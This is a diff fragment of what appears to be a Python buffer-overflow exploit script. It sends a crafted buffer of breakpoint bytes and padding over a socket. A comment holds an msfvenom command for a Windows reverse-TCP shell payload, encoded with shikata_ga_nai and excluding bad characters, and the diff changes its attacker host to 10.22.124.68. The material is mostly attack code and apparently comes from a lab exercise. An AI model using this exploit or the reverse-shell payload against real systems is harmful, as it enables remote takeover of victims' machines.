@@ -19,4 +19,4 @@ buf += "\xCC\xCC\xCC\xCC"
 buf += "D"*(buf_totlen-len(buf))
 s.send(buf + '\n') 
 
-#get shellcode (goes before the D's) from msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d
+#get shellcode (goes before the D's) from msfvenom -p windows/shell_reverse_tcp LHOST=10.22.124.68 LPORT=443 -f python --var-name=shell –e x86/shikata_ga_nai -b "\x00\x0a\x0d" 
